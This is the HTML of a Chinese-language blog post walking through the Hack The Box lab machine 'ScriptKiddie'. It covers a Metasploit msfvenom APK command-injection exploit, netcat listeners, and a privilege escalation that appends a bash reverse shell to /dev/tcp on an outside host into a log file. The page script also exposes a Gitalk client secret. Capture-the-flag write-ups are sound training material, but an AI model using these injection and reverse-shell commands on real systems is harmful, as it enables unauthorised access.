@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>ScriptKiddie - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - ScriptKiddieHackthebox-ScriptKiddie靶场实战 靶场信息   靶场类型   信息搜集 先使用nmap进行最基本的端口扫描 nmap -A -sS -sV -sC 10.10.10.226   发现开启了22端口和5000端口，再次基于能不爆破就不爆破的原则，我们直接看5000端口 5000端口上运行了Werkzeug，通过google搜索发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ScriptKiddie - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - ScriptKiddieHackthebox-ScriptKiddie靶场实战 靶场信息   靶场类型   信息搜集 先使用nmap进行最基本的端口扫描 nmap -A -sS -sV -sC 10.10.10.226   发现开启了22端口和5000端口，再次基于能不爆破就不爆破的原则，我们直接看5000端口 5000端口上运行了Werkzeug，通过google搜索发">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/7a534b9d-b47d-45a8-8740-b7309044837f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/a2ea7254-49e2-42b9-b0c6-e4592efdf79a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/e511ae46-85df-4431-b5fa-f913d377841e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/c9e0df80-af0f-4eeb-b592-dcb2c36736ce.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/9c50b024-27d9-4f09-8c2a-241750fde5f9.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/79b6d3da-5196-4fe9-8a3d-3d9c9e17c39a.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/e06af414-5690-4847-b3f7-6dd764f269f3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/ebf005c2-ff4a-444a-a859-66c97e8b5a99.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/60b36e3f-7d3b-4c29-94de-6b81213f15db.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/f3b36089-d3b0-4ac1-8f99-998f98936d63.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/028bb04c-a9a9-4b7a-bcb2-d5756b1516cc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/b31ff21e-ad67-4c22-9696-dd1badb88371.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/d68c6f85-2144-4e3a-94a4-dd3694782525.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/2cbbcdc9-3312-4910-93b3-33f09d8ae062.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/60e7863d-313d-47a7-9eba-435f6aad39d4.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/2fe629f8-2b73-447e-8baa-fa3016fbf1e8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/78ee58dc-3fe4-4ef7-91ac-1fb04f9a294e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/d41b4682-8f47-4d28-957a-18b394c5cab2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/2c2e4c6b-a2d9-4567-afd9-5c9afe03a966.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/83530a5b-8c31-4822-a7de-1752b3a4b84d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/38bef9fc-4097-43d6-a2c3-8646c4ecc1fc.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/b843ae8b-a7e9-42b4-80d0-b00cc509f91e.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/8ba61c98-c746-4b19-9207-ae5227af30e3.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/a04c9bef-b633-4245-b0f3-05a36f1fe0d2.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/b59b1ab2-6caf-4016-a35f-77ff3617faa6.png">
+<meta property="og:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/3ba5507b-c0b2-4ae4-82b4-0c1ae9bd44a1.png">
+<meta property="article:published_time" content="2021-05-24T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:50:05.022Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/7a534b9d-b47d-45a8-8740-b7309044837f.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ScriptKiddie - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">ScriptKiddie - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-05-24T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2021-05-24
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-ScriptKiddie"><span class="post-toc-text">Hackthebox - ScriptKiddie</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Hackthebox-ScriptKiddie"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ScriptKiddie - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-05-24 19:38:36" datetime="2021-05-24T11:38:36.000Z"  itemprop="datePublished">2021-05-24</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-ScriptKiddie"><a href="#Hackthebox-ScriptKiddie" class="headerlink" title="Hackthebox - ScriptKiddie"></a>Hackthebox - ScriptKiddie</h1><p><strong>Hackthebox-ScriptKiddie靶场实战</strong></p>
+<p>靶场信息</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/7a534b9d-b47d-45a8-8740-b7309044837f.png" class>
+
+<p>靶场类型</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/a2ea7254-49e2-42b9-b0c6-e4592efdf79a.png" class>
+
+<p>信息搜集</p>
+<p>先使用nmap进行最基本的端口扫描</p>
+<p>nmap -A -sS -sV -sC 10.10.10.226</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/e511ae46-85df-4431-b5fa-f913d377841e.png" class>
+
+<p>发现开启了22端口和5000端口，再次基于能不爆破就不爆破的原则，我们直接看5000端口</p>
+<p>5000端口上运行了Werkzeug，通过google搜索发现Werkzeug存在Werkzeg debug shell漏洞，但对比了下版本不适用，那就只能先访问5000端口看看具体情况了</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/c9e0df80-af0f-4eeb-b592-dcb2c36736ce.png" class>
+
+<p>这是一个继承了nmap、msfvenom、searchsploit工具的一个小黑客工具？那就先尝试一下他的工具吧。使用nmap扫描一下本地端口</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/9c50b024-27d9-4f09-8c2a-241750fde5f9.png" class>
+
+<p>我们获得的信息有nmap版本为7.80</p>
+<p>尝试搜索漏洞</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/79b6d3da-5196-4fe9-8a3d-3d9c9e17c39a.png" class>
+
+<p>通过google和exploit-db均未发现可getshell的漏洞，放弃该思路</p>
+<p>漏洞利用</p>
+<p>我们把目光放到第二个工具msfvenom上</p>
+<p>搜索venom发现了一个APK模板命令注入漏洞</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/e06af414-5690-4847-b3f7-6dd764f269f3.png" class>
+
+<p>将exploit-db上的exp给下载下来并进行修改</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/ebf005c2-ff4a-444a-a859-66c97e8b5a99.png" class>
+
+<p>然后执行该EXP</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/60b36e3f-7d3b-4c29-94de-6b81213f15db.png" class>
+
+<p>获得了evil.apk文件，在本地监听443端口后将该文件上传</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/f3b36089-d3b0-4ac1-8f99-998f98936d63.png" class>
+
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/028bb04c-a9a9-4b7a-bcb2-d5756b1516cc.png" class>
+
+<p>能弹回来，但shell似乎有问题，我们直接使用msf来生成，免去麻烦</p>
+<p>首先运行msf然后</p>
+<p>use exploit&#x2F;unix&#x2F;fileformat&#x2F;metasploit_msfvenom_apk_template_cmd_injection来载入exp</p>
+<p>设置好ip和端口后输入exploit执行</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/b31ff21e-ad67-4c22-9696-dd1badb88371.png" class>
+
+<p>获得脚本&#x2F;root&#x2F;.msf4&#x2F;local&#x2F;msf.apk</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/d68c6f85-2144-4e3a-94a4-dd3694782525.png" class>
+
+<p>然后本地使用nc监听4444端口</p>
+<p>Nc –nvlp 4444</p>
+<p>使用5000端口上的第二个脚本进行上传</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/2cbbcdc9-3312-4910-93b3-33f09d8ae062.png" class>
+
+<p>成功反弹回一个shell，我们执行以下命令获得一个稳定的shell</p>
+<p>SHELL&#x3D;&#x2F;bin&#x2F;bash script -q &#x2F;dev&#x2F;null</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/60e7863d-313d-47a7-9eba-435f6aad39d4.png" class>
+
+<p>在根目录下我们成功取得普通用户的flag</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/2fe629f8-2b73-447e-8baa-fa3016fbf1e8.png" class>
+
+<p>权限提升</p>
+<p>进入home目录，发现除了我们使用的kid用户以外，还有一个pwn用户</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/78ee58dc-3fe4-4ef7-91ac-1fb04f9a294e.png" class>
+
+<p>进入目录并查看文件</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/d41b4682-8f47-4d28-957a-18b394c5cab2.png" class>
+
+<p>发现有一个scanlosers.sh脚本</p>
+<p>我们查看一下脚本内容</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/2c2e4c6b-a2d9-4567-afd9-5c9afe03a966.png" class>
+
+<p>该脚本会一直扫描&#x2F;home&#x2F;kid&#x2F;logs&#x2F;hackers的目录文件的IP地址</p>
+<p>该脚本未对hackers文件传入的内容做过滤，并且我们使用的kid用户也有对该文件的编辑权限，我们直接写入一个命令执行，来让他把pwn用户的权限反弹给我们</p>
+<p>我们本地监听一个新的端口5555</p>
+<p>Nc –nvlp 5555</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/83530a5b-8c31-4822-a7de-1752b3a4b84d.png" class>
+
+<p>先切换到logs目录</p>
+<p>Cd logs</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/38bef9fc-4097-43d6-a2c3-8646c4ecc1fc.png" class>
+
+<p>然后写入恶意代码</p>
+<p>echo “ ;&#x2F;bin&#x2F;bash -c ‘bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.135&#x2F;5555 0&gt;&amp;1’ #” &gt;&gt; hackers</p>
+<p>直接使用echo输入，或是手动编辑均可，只要能把命令写入进去即可</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/b843ae8b-a7e9-42b4-80d0-b00cc509f91e.png" class>
+
+<p>写入成功，并成功反弹回pwn用户的shell</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/8ba61c98-c746-4b19-9207-ae5227af30e3.png" class>
+
+<p>使用sudo -l检查一下pwn用户的权限</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/a04c9bef-b633-4245-b0f3-05a36f1fe0d2.png" class>
+
+<p>发现pwn用户拥有msf的权限，且不需要root密码，直接进入msf调用root权限</p>
+<p>sudo &#x2F;opt&#x2F;metasploit-framework-6.0.9&#x2F;msfconsole</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/b59b1ab2-6caf-4016-a35f-77ff3617faa6.png" class>
+
+<p>成功使用root权限进入msf，此时咱们已经拥有root权限，直接进入root目录拿root用户的flag即可</p>
+<img src="/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/3ba5507b-c0b2-4ae4-82b4-0c1ae9bd44a1.png" class>
+
+<p>成功拿下root权限的flag</p>
+<p>收工睡觉</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/&title=《ScriptKiddie - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/&title=《ScriptKiddie - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ScriptKiddie - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2021/05/24/Hackthebox/Hackthebox-Knife/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">Knife - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/&title=《ScriptKiddie - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/&title=《ScriptKiddie - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ScriptKiddie - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/05/24/Hackthebox/Hackthebox-ScriptKiddie/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACwUlEQVR42u3a0U4jMQwF0P7/T7PSPrFiO73XnkAlTp7QQDM5qZQY249HPD7+jq8/f37y9fmzGZ799nrm6xlWAw8PD2+09Gfjmpe8Mpnt2ZPkUy+2AA8PD+8YL78MEl5ykSRbsHkvHh4e3jvwrp+0ITIeHh7eb+Bdh7PJbzcXDx4eHt678fJFJ+Bk5utQe7aJeHh4eN/D2xTAfurnb6rv4eHh4ZVV9dlRvm9B2Kztn3Xi4eHhHeDlLVN5I1QboOfIJLgv+rnw8PDwRrxZE0DbmNVuTZtueLoSPDw8vAO8qIAU/E37+mS2WTge3YF4eHh4C97m+N6kLfIltmW5oicCDw8Pb8TLUwCzVoDks/nmtkkKPDw8vHO8fNGzA/reToe6FIeHh4d3K2+20FnqdtYZ1V4q0XLx8PDwFryW1AbEbYqhTfhGiWY8PDy8W3l53N22C8y2bJMc+c8TPDw8vAO8TdmpbZO6K2huvwA8PDy8e3mRfhTO5gmItq2qCPTx8PDwDvDagLUtd93b2jUM4vHw8PBu5eXNAXmJa5NcyFsNoiQyHh4e3mFekiaI6mllIN4uutg4PDw8vAO8/ZGdJx3yotcsWH/xHwMeHh7eTbxZOiCZOk8ltIWxgo2Hh4d3jNcGuHlgnc+Wb1b+BeDh4eGd4M2O+KTAvylu7UtiRTICDw8Pb8SbHf15sNse8fskyHDg4eHhxbxZY9OJVMXmsqlbr/Dw8PAO8NpUQn7ot8vdJETw8PDw7uV9lKMNr9uS1T6F8aK+h4eHh7fmbdIQeeg8yxLk7z2SwMXDw8O75OXNT8lxv2+ZagP3qHUADw8P7wCvvQzaktXmehhmWfDw8PDemJcnF/ZNBnX6Aw8PD+9HeckRn4e/7YUxDNzx8PDwjvGSZMQmbbF/y2M28PDw8A7wNgWwJKFwV7i8Subi4eHh3cP7A+griL0ozGviAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+
+</body>
+</html>
